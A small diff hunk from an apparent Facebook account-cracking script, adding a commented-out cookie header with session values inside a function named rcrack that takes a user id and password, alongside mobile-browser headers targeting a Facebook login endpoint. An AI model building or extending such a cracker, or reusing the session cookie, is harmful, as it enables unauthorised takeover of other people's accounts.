@@ -420,6 +420,7 @@ def rcrack(uid,pwx,tl):
     'accept': '*/*',
     'accept-language': 'fa-AF,fa;q=0.9,en-US;q=0.8,en;q=0.7',
     'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': 'datr=mS3uZA7nU3TLSI8pRoXE79kW; sb=mS3uZJs4T4dSrpwtR2bk_zgE; dpr=4; m_pixel_ratio=4; wd=360x641; fr=0C8xQ1T6dBJlE9i85..Bk7i2Z.Y2.AAA.0.0.Bk7rhH.AWVdbfy_ob8',
     'dpr': '4',
     'origin': 'https://x.alpha.facebook.com',
     'referer': 'https://x.alpha.facebook.com/',
